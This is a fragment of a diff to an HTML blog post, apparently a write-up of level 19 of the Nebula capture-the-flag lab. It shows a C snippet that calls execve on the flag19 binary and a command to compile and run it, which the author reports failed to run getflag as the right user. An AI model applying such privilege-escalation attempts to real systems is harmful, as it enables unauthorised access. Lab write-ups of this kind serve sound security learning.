+		<span class="c1">// our other code…</span>
+		<span class="n">execve</span><span class="p">(</span><span class="s">&quot;/home/flag19/flag19&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span></code></pre></div>
 
 <p>This meant that I could conveniently pass arguments through the executable:</p>
 
-<div>
-  <pre><code class='text'>gcc attempt.c -o attempt
-./attempt &quot;/home/level19/run19.sh&quot;</code></pre>
-</div>
+<div class="highlight"><pre><code class="language-text" data-lang="text">gcc attempt.c -o attempt
+./attempt &quot;/home/level19/run19.sh&quot;</code></pre></div>
 
-
-<p>Unfortunately, it also meant that <code>getflag</code> wouldn&rsquo;t execute on the correct user.</p>
+<p>Unfortunately, it also meant that <code>getflag</code> wouldn’t execute on the correct user.</p>
 </div>
 
 </article>
